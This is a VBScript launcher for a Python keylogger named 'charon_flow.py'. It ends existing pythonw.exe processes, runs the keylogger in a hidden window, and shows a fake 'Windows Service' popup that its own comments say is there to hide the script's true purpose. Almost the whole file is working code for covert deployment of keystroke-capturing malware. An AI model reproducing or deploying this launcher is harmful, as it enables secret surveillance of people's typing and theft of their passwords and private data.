Option Explicit

' Create objects
Dim WshShell, FSO, strScriptPath, strKeyloggerPath, objExec, strCmd

' Initialize objects
Set WshShell = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")

' Get the script directory
strScriptPath = FSO.GetParentFolderName(WScript.ScriptFullName)
strKeyloggerPath = strScriptPath & "\charon_flow.py"

' Check if the file exists
If FSO.FileExists(strKeyloggerPath) Then
    ' Kill any existing python processes first that might be running our keylogger
    On Error Resume Next
    WshShell.Run "taskkill /f /im pythonw.exe", 0, True
    On Error GoTo 0
    
    ' Wait a moment for processes to terminate
    WScript.Sleep 2000
    
    ' Create a more reliable command with full path and explicit error handling
    strCmd = "cmd.exe /c start /b pythonw.exe """ & strKeyloggerPath & """ --background"
    
    ' Run the command with hidden window (0 = hidden)
    WshShell.Run strCmd, 0, False
    
    ' Display a small notification that doesn't reveal the true purpose
    ' This helps confirm the script ran successfully without mentioning "keylogger"
    WshShell.Popup "System service started successfully.", 2, "Windows Service", 64
    
    ' Wait for keylogger to initialize
    WScript.Sleep 3000
Else
    ' File not found - log silently 
    On Error Resume Next
    Dim logFile
    Set logFile = FSO.CreateTextFile(strScriptPath & "\error.log", True)
    logFile.WriteLine("Keylogger file not found: " & strKeyloggerPath & " at " & Now)
    logFile.Close
    On Error GoTo 0
End If

' Clean up
set WshShell = Nothing
set FSO = Nothing